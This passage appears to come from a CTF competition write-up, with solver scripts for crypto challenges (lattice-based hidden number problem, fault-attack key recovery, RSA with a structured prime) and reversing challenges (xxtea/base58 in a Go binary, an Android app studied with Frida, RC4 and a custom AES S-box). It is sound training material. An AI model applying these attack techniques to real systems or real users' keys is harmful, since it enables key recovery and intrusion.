            guess(p,q,time+1)
            
guess('','',0)
```

HNP

```python
n = 10323061067499483916060238058562515040666242298045805295990313777848214629183814880316990343784543662446829812940766755419243349611482598919786907200483693
a = [6120369445490150758707860015797468446335540092464037125603103929184518589611874304563308516374617602564413411303544814584962039521102249711976613978281303, 4423464653370072773190758011138363595723786602033768946799158506405304271451180475981121887957678806216532811288650803464600381365457657232388571745866937, 6950399776566962875238692240048920965837962296986417904489966797684386286305984319322206067215908016500452241899237952656874731135745331777626477493839912, 9595231496278646944619165863883454302740820606108561438001417415612629744342785198486729903382765283674126920748271174309992992880177765455457602151465559, 303333209383785503134714987393937536829250976677181281216175719312169333163199205443038037446480768298278991547926847783000658730487201935706518523428810, 883933782863433792375827225510455483408344161193662788928221715755196306890756457792530729749106832718390410972916408400566875223447899043933753624459899, 6888650801295016813629482104741954839261436288220369965546012482368175822291983444941876016486802099593959903399236804180153496552164287474134394386638231, 4864730542975332416303003278268577177063989338916175184928227974687026611314811097597038668160493266929751611818955890993370922389113672145623728079631582, 9617257501905146884392232972367592787575429074328101498003357520681594401197863200151244326814026930201029264473756709632363596649082904291139419498330028, 8662687722010691935858628040356158698672136029519045420667701535942389582498683464551254790319822684012232809333364032607938703277731789981170961455417852, 6161996199499331892552407355003356975475529645930301417479722661650881423449507008439358464414576095805782634652744785748491540040806487306951916631563400, 2658582466786929245991006954166983839843500374259700315466444441980904981943529593564021210862284344165803988701042831336179438926159152377024784520221039, 805159286000022187144503959384608715585145458540337120828049356080251640463626309846692909089504722758292466064452086042435635611050725256329360770136591, 3485899408055679111125387413911255868355863270329692631701704159580120534913110632991063886982051886688830222172868249273968978638409370855484044210714096, 5062243122473068357063442777757928010649408210401727246085519380460722642064442264881609793442216485869438976777302342226228350415190410853449718410427813, 1838624693003530412690072478080650315476834494936402084926877720931958198938402799846229469450215410951493417848532701306342924424999735965997069239641363, 5676120024900050568608627099778617329561064297939615209995636181689570484158504246428681698348703322577811596433668170524321757675993294408485354954624563, 4361959543909455241929569320930136934789644776067310401128956466006809488131407974261491622947641674142896813041634782923113879231022528229633469190353745, 2186232765188211243832782644197064642636502607958963603724604067683485096042338152696087320678568186098262387585374672205409333112929960099049192054757920, 6252213149927345451851623924417067978131727192478199855998989597486852999553477768652699173547322539921888000701497587522561811907954774635155279780124857, 8194163021206724102389238870921084485247047367295920808095278795761207194042008848036451497060951118500640283879189382912432322141370105565246927767464631, 9976079883535896432796773624021377420992384743165280398665633430345149543101999588701280518451661846279372391439868272159526368118775354925659008471432956, 1925044060359089535934545718522263481986253889063569731344875180839349559919688364295747264531712798090185253796812554808671203018918503736177813343098125, 9161899598933936934441466278037003627326754019321531414164012408328469405966126042583444793642797829855655281396292300653804617371432034126369987045943915, 9109594293527817928054731655288246493367918386538377778519817150554546097137211661481356899444750566478394509602751080742856567557539482919474013544497045, 1907099129477614260463738570507049287967469898110091237937521448598101910896289508954187041308683640158631125913845480049558415950480058577413843690471709, 660209793527976479858516565658250351731440870921078792867404829280489344061493726107147950168312081904661754930126963356684401347695036840883489205923829, 9621522699660238031124719703972832457881667602516487741278923904732534188438615484641177154008708612078326305692451313862074009403941661858978311227854043, 654484563680267114568161058623945647818466126401162601535283338114940194622398469993382433407959375745298991716164805398245380911099764526912714018662231, 1536240310255718594849481108951900260707980752572853702069920308124518019570560586341098756284680286083086286385552797903602519933542432722975618294882629, 828708761173204760492412669046675917792547210727187238554161185288597985007575260178250062096422712140329523702034681599572211783190625542327739673675750, 8542094117703518853350431166254154354124936771059920634688059611796621303337297683369673264023423831988582138576852410057467134886960576505288610347545605, 6109168262347421573228888570552600317906197161548795474206387750863547532362459150590898442506732872800270331227878924444691925801792672034629815170289858, 7863241992569231300669310977161167863702930432997410458078505762958893114443914850131398116669715942867908667991781327205897201424574876273333422901104004, 529729306843422225909568182592575552074999866038776011674782827584144555396065958583141115495241699707544056011842345973403240405239246319559756777516672, 8039222904354158148745519845922304975112342838885051579985111339797319485148824071851952617392201951145798964867067394611425775383230415930448574729163120, 7439443280902373617974885844228238419872049713211754787369281900833244068626771954483300134258613273436377910416887069071526906375487454382434441759142244, 5839879235706088388405663645884240480870311913833203636649195290758781424193729680505553518491540949001000283836372029106839130615622734777245419694989754]
b = [10172, 218, 61829, 55599, 44936, 48902, 34717, 2903, 49039, 51747, 40654, 8243, 64794, 53457, 64427, 39029, 56302, 63748, 473, 52295, 45877, 9355, 9511, 30351, 51775, 31089, 62899, 17091, 19535, 58682, 23926, 26080, 24757, 46536, 51997, 43352, 29361, 24632]

print(len(b))
L = 38
for i in range(len(a)):
    a[i] = int(a[i]/2^16 %n)
    b[i] = int(b[i]/2^16 %n)

def babai(A, w):
    A = A.LLL(delta=0.75)
    G = A.gram_schmidt()[0]
    t = w
    for i in reversed(range(A.nrows())):
        c = ((t * G[i]) / (G[i] * G[i])).round()
        t -= A[i] * c
    return w - t

def solve_hnp(t, u):
    M = Matrix(RationalField(), L+1, L+1)
    for i in range(L):
        M[i, i] = n
        M[L, i] = t[i]
        M[L, L] = 1 / n
    closest = babai(M, vector(u + [0]))
    return (closest[-1] * n) % n

phi = solve_hnp(a, b)
print(phi)
```

### welcomesigner2

![](static/Ty7JbZO6yoksfVxh6UfcBf48njf.png)

```python
from hashlib import sha256
from pwn import *
from sympy import nextprime
import re
import gmpy2
import libnum
from tqdm import tqdm
context.log_level = 'debug'

p = remote('1.13.101.243',25557)
sig = []
p.recvuntil(b'|\t[Q]uit\n')
p.sendline(b'g')
a = p.recvline()
cp = p.recvline()
n = eval(a[6:-1])
cp = cp[20:-1].decode()
p.recvuntil(b'|\t[Q]uit\n')
p.sendline(b's')
p.recvuntil(b'Where your want to interfere:')
p.sendline(b'0')
s = p.recvline()
s = (eval(s[42:]))
p.recvuntil(b'|\t[Q]uit\n')
p.sendline(b'f')
p.recvuntil(b'bytes, and index:')
p.sendline(input().encode())

for i in range(1024):
    p.recvuntil(b'|\t[Q]uit\n')
    p.sendline(b's')
    p.recvuntil(b'Where your want to interfere:')
    p.sendline(str(i).encode())
    s = p.recvline()
    s = (eval(s[42:]))
    sig.append(s)
print(sig)
```

```python
s = 
cp = 0x44a015341af55fce10a619783a272ce09269fcbc957f4e73bcba61a1355f1d71d17246a873c2b69a247e1337017289fd
n = 116659638985587310297203528660453582053933956630679707125742151593201969458977258659248829043554287574456160275119891619777802236788782804444512863273422096785890699608278116999732435349387411973563362137806332221905914355386905257032684609799080027453968945579791850467337020287917383711053102518814046656251
n_ = 116659638985587310297203528660453582053933956630679707125742151593201969458977258659248829043554287574456160275119891619777802236788782804444512863273422096785890699608278116999732435349387411973563362137806332221905914355386905257032684609799080027453968945579791850467337020287917383711053102518814046656013
B = [msg]
for i in range(1024):
    B.append(B[-1]**2 % n)
s = s[::-1]
s = s[1:]
d = '1'

for i in range(len(s)-2,-1,-1):
    #print(i)
    d_ = int(d,2)
    d2 = d_*2
    if s[i-1]*invert(pow(B[i-1],2*d2,n_),n_)*pow(B[i],d2,n_)%n_ == s[i]:
        d = d+'0'
    else:
        d = d+'1'
    #print(s[i-1]*invert(pow(B[i-1],2*d2,n_),n_)*pow(B[i],d2,n_)%n_ == s[i],int(d,2))
print(d)
d = int(d,2)
from Crypto.Cipher import AES
from hashlib import md5

key = bytes.fromhex(md5(str(d).encode()).hexdigest())
enc = AES.new(key,mode=AES.MODE_ECB)
c   = enc.decrypt(long_to_bytes(cp))
print(c)
```

### welcomesigner1

![](static/Vm9Db3iQ6ooEhZxHzw4czYsknJb.png)

```python
from gmpy2 import gcd,invert
s = 
cp = 0xd8727d8050304772a053417ecf6e2ac8b807eae82da646b262bb6387294bf91bf6161eb46834c890eee5e3ce8b365af1
n = 73752499859232970485823738768055211629114275614790923962029755470459349875545760607337575877969621330959315200676555143727889937630064965588656541704202580321543066348536045826767749969084096231928630405501511419771776373410280082070271050651613443384114683268921041450537100805523245173788693224031062396047
n_ = 73752499859232970485823738768055211629114275614790923962029755470459349875545760607337575877969621330959315200676555143727889937630064965588656541704202580321543066348536045826767749969084096231928630405501511419771776373410280082070271050651613443384114683268921041450537100805523245173788693224031062396129

B = [msg]
for i in range(1024):
    B.append(B[-1]**2 % n)

dd = '10'
d = '0'*1024

for i in range(len(s)-3,0,-1):
    if i == len(s)-3:
        continue
    s1 = s[i-1]
    s2 = s[i]
    dr = d[2:][::-1][-i:]
    R = len(dr)
    print(R)
    ddd = int(dd,2)
    #print(bin(ddd),bin(dl))
    
    if (s1*invert(pow(pow(msg,2*ddd,n),pow(2,R-1,n_-1),n_),n_)*pow(pow(msg,ddd,n),pow(2,R,n_-1),n_)%n_ == s2):
        dd += '0'
    else:
        dd += '1'
        
print(dd)
d = int(dd,2)
from Crypto.Cipher import AES
from hashlib import md5

key = bytes.fromhex(md5(str(d).encode()).hexdigest())
enc = AES.new(key,mode=AES.MODE_ECB)
c   = enc.decrypt(long_to_bytes(cp))
print(c)
```

### badprime

```python
n = 1640394031841216645946873347318490236552165557033371349894559657095671727829537746444761607290279475478979116129978121879806866726352720727494912263922805906042228703580499025808271565362349526142045643809911558893503763904359776758670399487167078493147626432061995595319012674894611819831078571250822497604412888285052530403461067220986053915263371792442515133726334131033023701347012238411176061142094876259536174554310829616263129541952326178383961718362597155262024688657517115874684774198544817242561629713608802675102419965257174200238339686430582900090893802367679154018277836157173430533666191047367065843043
c = 470501574381291928906280325461083852389649358160764688753456078133620676239563568561684660030564932478183426305718608313730563845823792779054052451833486925781337504921546897343309961657150361645413195409308739803255299425694449040782582693174577906847422718944786698067526357602844877327902454069595907079372408636895841924766876740545381014390854000935291912059830611394518028387272985431494165447424401014822615263941384878839423573759676933925576746848893984158606724681182378795834608027691377664032424849711217910323418224966855364943496372578763269393867374187501949592214381215788375635550908727607265635218
l = 6483018131591396051983356868671909729741937834010757344857291032423996837243090072515774595291990021958302001197664754680311072877882996201901608461725120697744993979895281174618086415372293181455599758902689563509615168072397943305479842637642868599290565324598078889703767416860720243862793
m = 9733886535057688671610754799811962618229875639090207942918603767378427702701564139578352984230854289084319163516017271342432460067909493522405070655504327949007603610386257606046925362770501606527280092801847792830132642076710842398128622571681249006380107269752935098632429318061372742686715
M = m*2

M1,M2 = m+l,l
R.<x> = PolynomialRing(Zmod(n))
f = M2+M*x
f = f.monic()
print(f.small_roots(X = 2^53,beta = 0.4))

x = 560712041426737
p = M2+M*x
q = n//p
phi = (p-1)*(q-1)
e = 65537
d = inverse_mod(e,phi)
import libnum
print(libnum.n2s(int(pow(c,d,n))))
```

## Reverse

### Gohunt

是万恶的 go 语言。

运行程序，输入 flag 后生成二维码。题目给出了目标二维码。能扫出内容

![](static/M3yrbSCVlovgxhxj2LRcWF3snb8.png)

IDA64 打开，main 函数一坨，所有程序功能都写一块了。F5 反编译更乱，不用看了，直接调试。

调试到图示位置，输入直接打一堆"1"，能在寄存器找到输入内容的内存。

![](static/OpgvbNEr1oYRhXxwNtncbVw6nvb.png)

注意输入值会 pad 一个输入的长度（int32）

往下看到熟悉的 xxtea 加密

![](static/BBA2bebxdozHZ8xpoYQcK7xRnBh.png)

下面发现密钥

![](static/WfHLbDiino3ccRxNPpkcDf2Rn00.png)

再往下 MX 函数什么都是正常的，调用的库函数。唯一需要注意的是数据封装，4 个 byte 转换为一个 int32。

![](static/QI0CbNvHRoxF38xcP6Xc6NbAnCT.png)

这段循环看起来有右移，其实只是复制，没有任何变换。

![](static/O0tlbS40Qo0tQyxtj7acNKIUnxe.png)

再读取一个 key，循环异或。key 取 `key[i%16]`

![](static/F6fNbBlvJoUnfwxiebFcFlpBn0g.png)

到这为止做了个逆序。

接着是大数（big number）处理，将逆序后的字节转换为大整数（little）

![](static/OmIkbnr3CoYykFx3qc0czlHlnSd.png)

到这里有个<strong>带余除法</strong> ，将上面取得的大整数除以 `0x3A` ，取得余数。

![](static/DAZ4bvHU6og7fix2YoGcM3Cjnsc.png)

除完一遍的结果，本次余数为 `0x20`

接着是余数的处理

![](static/Cs0ub4o1hoVVg2xCUeccqqXNnzg.png)

余数减去 1 之后，用一个 table 转换。实测如果余数为 0 则转换为 `n`

循环直到大整数变为 0，之后还是逆序。

![](static/UqivbvbV9oAVMHxN4WgcN580n5g.png)

这里得出的结果其实跟生成的二维码扫出来是一样的了，所以后面的生成二维码部分代码不需要看。

程序分析完了，上代码吧。老规矩先复现再逆向，一边调试一边做提高正确率。大量冗余代码注意

```python
#hunt_test.py
import xxtea
#import qrcode
import mytea
import struct

inp = b'11111111111111111111111111111'
inp = inp + b'\x00\x00\x00' + struct.pack('<I', len(inp))
print(inp)

key_xxtea = b'FMT2ZCEHS6pcfD2R'
#res = xxtea.encrypt_hex(inp, key_xxtea, padding=False)
#res = mytea.encrypt(9, inp, key_xxtea)
res = mytea.encrypt_hex(inp, key_xxtea)
print(res)
print(len(res))
print([x for x in res])

def printhex(h):
    print([hex(x) for x in h])

res_xxtea = [  0xCB, 0x46, 0xFE, 0x29, 0x88, 0x3A, 0x8A, 0x36, 0x87, 0xBD, 
    0xDA, 0x53, 0xAD, 0x30, 0x77, 0x9B, 0xB2, 0xC6, 0xA8, 0x73, 
    0x02, 0x34, 0x82, 0x34, 0x76, 0x74, 0xF0, 0xA7, 0x5E, 0xBD, 
    0xD3, 0x6C, 0xF8, 0x75, 0x6E, 0x8A]

k2 = b'NPWrpd1CEJH2QcJ3'

res_xor = []
for i in range(len(res)):
    res_xor.append(res[i] ^ k2[i%0x10])
print(res_xor)
printhex(res_xor)
#['0x85', '0x16', '0xa9', '0x5b', '0xf8', '0x5e', '0xbb', '0x75', '0xc2', '0xf7', '0x92', '0x61', '0xfc', '0x53', '0x3d', '0xa8', '0xfc', '0x96', '0xff', '0x1', '0x72', '0x50', '0xb3', '0x77', '0x33', '0x3e', '0xb8', '0x95', '0xf', '0xde', '0x99', '0x5f', '0xb6', '0x25', '0x39', '0xf8']

res_xor.reverse()
print('xor')
printhex(res_xor)

big = 0
for i in range(len(res_xor)):
    big = big | (res_xor[i] << 8 * i)
print('big')
print(hex(big))
#0x8516a95bf85ebb75c2f79261fc533da8fc96ff017250b377333eb8950fde995fb62539f8

table = b'Y7TwcE41bzWvMQZXa8fyeprJoBdmhsu9DqVgxRPtFLKN65UH2CikG3SAjn'

v = 0x1A7B9611A7B9611A
res = []
while big > 0:
    big, m = divmod(big, 0x3A)
    #print(hex(big), hex(m))
    #print(hex(table[m-1]))
    #m-1 == -1就是n
    res.append(table[m-1])

res.reverse()
print('res')
print(res)
printhex(res)
print(''.join([chr(x) for x in res]))

after1round = [  0xDC, 0x54, 0xDD, 0x2A, 0x67, 0x75, 0xCA, 0x65, 0x0B, 0xD7, 
    0xF3, 0x16, 0x4D, 0xC5, 0xBA, 0xF4, 0xE9, 0xE9, 0x25, 0x42, 
    0x71, 0x3A, 0x3F, 0x23, 0x51, 0xC0, 0x1E, 0xF6, 0xEB, 0xDF, 
    0x8E, 0xDC, 0xD9, 0x6C, 0x4B, 0x02]

u1 = [  0x59, 0x6E, 0x56, 0x39, 0x47, 0x56, 0x41, 0x56, 0x4D, 0x74, 
    0x38, 0x4D, 0x4E, 0x43, 0x76, 0x4A, 0x73, 0x46, 0x37, 0x46, 
    0x65, 0x63, 0x68, 0x6A, 0x77, 0x32, 0x44, 0x38, 0x79, 0x5A, 
    0x50, 0x78, 0x63, 0x73, 0x61, 0x33, 0x51, 0x72, 0x65, 0x75, 
    0x70, 0x78, 0x4A, 0x67, 0x54, 0x66, 0x55, 0x42, 0x6B, 0x39]

u1s = ''.join([chr(x) for x in u1])
print(u1s)
#YnV9GVAVMt8MNCvJsF7Fechjw2D8yZPxcsa3QreupxJgTfUBk9

ref_fakeflag = b'YnV9GVAVMt8MNCvJsF7Fechjw2D8yZPxcsa3QreupxJgTfUBk9'

ans = b'YMQHsYFQu7kkTqu3Xmt1ruYUDLU8uaMoPpsfjqYF4TQMMKtw5KF7cpWrkWpk3'

#solve

#recover = ref_fakeflag

#recover = [x for x in ref_fakeflag]
recover = ans
#recover.reverse()

sum = 0
for i in range(len(recover)):
    ind = table.index(recover[i]) + 1
    if (recover[i] == ord('n')):
        ind = 0
    sum = sum * 0x3a + ind
print(hex(sum))

xor = []
while sum != 0:
    sum, r = divmod(sum, 256)
    xor.append(r)

printhex(xor)
xor.reverse()

res_xor = []
for i in range(len(xor)):
    res_xor.append(xor[i] ^ k2[i%0x10])

printhex(res_xor)
res_xxtea = res_xor

res = mytea.decrypt_hex(bytes(res_xxtea), key_xxtea)
print(res)
#b"wmctf{YHNEBJx1WG0cKtZk8e2PNbxJa45WQF09}\x00'\x00\x00\x00"
```

### ezAndroid

使用了 pthread 反调试,那就把用了 pthread 的地方 nop 掉就好了

![](static/BjaVbkTJLouQLgxRSgNczez9nmc.png)

用 ida 反编译没看到 java 层用到的导出函数,那应该是动态加载的,用 frida 搜一下

```javascript
function frida_Memory() {
    Java.perform(function () {
        // 先获取 so 的 module 对象
        var module = Process.findModuleByName("libezandroid.so");
        //?? 是通配符
        var pattern = "68 65 63 6b";
        // 基址
        console.log("base:"+module.base)
        // 从 so 的基址开始搜索，搜索大小为 so 文件的大小，搜指定条件 03 49 ?? 50 20 44 的数据
        var res = Memory.scan(module.base, module.size, pattern, {
            onMatch: function(address, size){
                // 搜索成功
                console.log('搜索到 ' +pattern +" 地址是:"+ address.toString());
                console.log(hexdump(address.sub(0x10), {
                    offset: 0,//相对偏移
                    length: 256,//dump的大小
                    header: true,
                    ansi: true
                  }));  
            }, 
            onError: function(reason){
                // 搜索失败
                console.log('搜索失败');
            },
            onComplete: function()
            {
                // 搜索完毕
                console.log("搜索完毕")
            }
          });
    });
}
```

![](static/EXynbm2fhoqyEFxiRbYcfUGLnbe.png)

看了看 `JNI_OnLoad`,这里应该是用 `jniRegisterNativeMethods` 注册 native 接口

![](static/POT2b7C3aomjeTxStZ5c8M0Enec.png)

hook 了 `0x6C2C`,看到 RC4 的密钥是 `12345678`,RC4 加密完还有个异或才能得到正确的 username

![](static/JFFmbz0yboJPPzxq3oHcFj3Nnqf.png)

```python
def RC4(data, key):
    if type(data) == type('oacia'):  # 判断是否为字符串
        data = [ord(i) for i in data]
    if type(key) == type('oacia'):
        key = [ord(i) for i in key]

    S = list(range(256))
    j = 0
    out = []

    # KSA Phase
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    # PRGA Phase
    i = j = 0
    for ch in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(ch ^ S[(S[i] + S[j]) % 256])

    return out


def RC4encrypt(plaintext, key):
    return RC4(plaintext, key)


def RC4decrypt(ciphertext, key):
    return RC4(ciphertext, key)


# Example usage
ciphertext = [0xe9, 0x97, 0x64, 0xe6, 0x7e, 0xeb, 0xbd, 0xc1, 0xab, 0x43]
key = "12345678"

# 对密文进行解密
decrypted = RC4decrypt(ciphertext, key)
for i in range(len(decrypted)):
    print(chr(decrypted[i] ^ i), end='')# Re_1s_eaSy
```

交叉引用了这儿的变量,最后交叉引用到了 `sub_3F0C`,说明密码大概率是 AES 加密

![](static/ISr9bi4pZo2MxnxPc52cQgRSnWZ.png)

这里的循环也可以验证我们的猜测

![](static/ApQFbcYHmo8JggxNykdcvTasnCQ.png)

需要注意这个 S 盒在 init.array 的时候是改变的,exp 如下

```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>

typedef struct{
    uint32_t eK[44], dK[44];    // encKey, decKey
    int Nr; // 10 rounds
}AesKey;

#define BLOCKSIZE 16  //AES-128分组长度为16字节

// uint8_t y[4] -> uint32_t x
#define LOAD32H(x, y) \
  do { (x) = ((uint32_t)((y)[0] & 0xff)<<24) | ((uint32_t)((y)[1] & 0xff)<<16) | \
             ((uint32_t)((y)[2] & 0xff)<<8)  | ((uint32_t)((y)[3] & 0xff));} while(0)

// uint32_t x -> uint8_t y[4]
#define STORE32H(x, y) \
  do { (y)[0] = (uint8_t)(((x)>>24) & 0xff); (y)[1] = (uint8_t)(((x)>>16) & 0xff);   \
       (y)[2] = (uint8_t)(((x)>>8) & 0xff); (y)[3] = (uint8_t)((x) & 0xff); } while(0)

// 从uint32_t x中提取从低位开始的第n个字节
#define BYTE(x, n) (((x) >> (8 * (n))) & 0xff)

/* used for keyExpansion */
// 字节替换然后循环左移1位
#define MIX(x) (((S[BYTE(x, 2)] << 24) & 0xff000000) ^ ((S[BYTE(x, 1)] << 16) & 0xff0000) ^ \
                ((S[BYTE(x, 0)] << 8) & 0xff00) ^ (S[BYTE(x, 3)] & 0xff))

// uint32_t x循环左移n位
#define ROF32(x, n)  (((x) << (n)) | ((x) >> (32-(n))))
// uint32_t x循环右移n位
#define ROR32(x, n)  (((x) >> (n)) | ((x) << (32-(n))))

/* for 128-bit blocks, Rijndael never uses more than 10 rcon values */
// AES-128轮常量
static const uint32_t rcon[10] = {
        0x01000000UL, 0x02000000UL, 0x04000000UL, 0x08000000UL, 0x10000000UL,
        0x20000000UL, 0x40000000UL, 0x80000000UL, 0x1B000000UL, 0x36000000UL
};
// S盒
/*
unsigned char S[256] = {
        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
};*/
unsigned char S[256] = {41,64,87,110,133,156,179,202,225,248,15,38,61,84,107,130,153,176,199,222,245,12,35,58,81,104,127,150,173,196,219,242,9,32,55,78,101,124,147,170,193,216,239,6,29,52,75,98,121,144,167,190,213,236,3,26,49,72,95,118,141,164,187,210,233,0,23,46,69,92,115,138,161,184,207,230,253,20,43,66,89,112,135,158,181,204,227,250,17,40,63,86,109,132,155,178,201,224,247,14,37,60,83,106,129,152,175,198,221,244,11,34,57,80,103,126,149,172,195,218,241,8,31,54,77,100,123,146,169,192,215,238,5,28,51,74,97,120,143,166,189,212,235,2,25,48,71,94,117,140,163,186,209,232,255,22,45,68,91,114,137,160,183,206,229,252,19,42,65,88,111,134,157,180,203,226,249,16,39,62,85,108,131,154,177,200,223,246,13,36,59,82,105,128,151,174,197,220,243,10,33,56,79,102,125,148,171,194,217,240,7,30,53,76,99,122,145,168,191,214,237,4,27,50,73,96,119,142,165,188,211,234,1,24,47,70,93,116,139,162,185,208,231,254,21,44,67,90,113,136,159,182,205,228,251,18};




//逆S盒
unsigned char inv_S[256] = {
        0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
        0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
        0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
        0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
        0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
        0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
        0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
        0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
        0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
        0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
        0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
        0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
        0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
        0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
        0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
        0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D
};

/* copy in[16] to state[4][4] */
int loadStateArray(uint8_t (*state)[4], const uint8_t *in) {
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            state[j][i] = *in++;
        }
    }
    return 0;
}

/* copy state[4][4] to out[16] */
int storeStateArray(uint8_t (*state)[4], uint8_t *out) {
    for (int i = 0; i < 4; ++i) {
        for (int j = 0; j < 4; ++j) {
            *out++ = state[j][i];
        }
    }
    return 0;
}
//秘钥扩展
int keyExpansion(const uint8_t *key, uint32_t keyLen, AesKey *aesKey) {

    if (NULL == key || NULL == aesKey){
        printf("keyExpansion param is NULL\n");
        return -1;
    }

    if (keyLen != 16){
        printf("keyExpansion keyLen = %d, Not support.\n", keyLen);
        return -1;
    }

    uint32_t *w = aesKey->eK;  //加密秘钥
    uint32_t *v = aesKey->dK;  //解密秘钥

    /* keyLen is 16 Bytes, generate uint32_t W[44]. */

    /* W[0-3] */
    for (int i = 0; i < 4; ++i) {
        LOAD32H(w[i], key + 4*i);
    }

    /* W[4-43] */
    for (int i = 0; i < 10; ++i) {
        w[4] = w[0] ^ MIX(w[3]) ^ rcon[i];
        w[5] = w[1] ^ w[4];
        w[6] = w[2] ^ w[5];
        w[7] = w[3] ^ w[6];
        w += 4;
    }

    w = aesKey->eK+44 - 4;
    //解密秘钥矩阵为加密秘钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密秘钥
    //即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3]
    for (int j = 0; j < 11; ++j) {

        for (int i = 0; i < 4; ++i) {
            v[i] = w[i];
        }
        w -= 4;
        v += 4;
    }

    return 0;
}

// 轮秘钥加
int addRoundKey(uint8_t (*state)[4], const uint32_t *key) {
    uint8_t k[4][4];

